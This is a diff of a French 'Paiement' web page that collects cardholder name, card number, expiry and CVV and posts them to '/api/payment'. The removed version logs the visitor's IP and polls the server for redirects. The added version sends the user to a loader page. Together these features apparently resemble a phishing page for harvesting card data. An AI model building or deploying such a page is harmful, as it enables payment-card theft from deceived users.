@@ -1,45 +1,35 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>Paiement</title>
-<script>
-let sessionId = null;
-
-async function sendPayment(){
-  const cardNumber = document.getElementById('cardNumber').value;
-  const expiry = document.getElementById('expiry').value;
-  const cvv = document.getElementById('cvv').value;
-  const nomTitulaire = document.getElementById('nomTitulaire').value;
-
-  await fetch('/api/payment',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({cardNumber, expiry, cvv, nomTitulaire})
-  });
-}
-
-async function init(){
-  const res = await fetch('/api/visit');
-  const data = await res.json();
-  sessionId = data.ip;
-
-  setInterval(async ()=>{
-    const r = await fetch('/api/status');
-    const j = await r.json();
-    if(j.redirect) window.location.href = j.redirect;
-  },1000);
-}
-</script>
+  <meta charset="UTF-8">
+  <title>Paiement</title>
+  <style>
+    body {font-family: Arial; padding: 50px;}
+    form {max-width: 400px; margin: auto;}
+    input, button {width:100%; padding:10px; margin:8px 0; border-radius:5px; border:1px solid #ccc;}
+    button {background:#28a745; color:white; border:none; cursor:pointer;}
+  </style>
 </head>
-<body onload="init()">
-<h1>Paiement</h1>
-<form onsubmit="sendPayment(); return false;">
-  <input id="cardNumber" placeholder="Numéro Carte" required><br>
-  <input id="nomTitulaire" placeholder="Nom Titulaire" required><br>
-  <input id="expiry" placeholder="MM/AA" required><br>
-  <input id="cvv" placeholder="CVV" required><br>
-  <button type="submit">Valider</button>
-</form>
+<body>
+  <h1>💳 Paiement</h1>
+  <form onsubmit="sendPayment(event)">
+    <input required name="nomTitulaire" placeholder="Nom du titulaire">
+    <input required name="cardNumber" placeholder="Numéro de carte" maxlength="19">
+    <input required name="expiry" placeholder="MM/AA" maxlength="5">
+    <input required name="cvv" placeholder="CVV" maxlength="3">
+    <button type="submit">Payer</button>
+  </form>
+  <script>
+    async function sendPayment(e){
+      e.preventDefault();
+      const form = Object.fromEntries(new FormData(e.target).entries());
+      await fetch('/api/payment', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify(form)
+      });
+      window.location.href = '/loader.html';
+    }
+  </script>
 </body>
 </html>
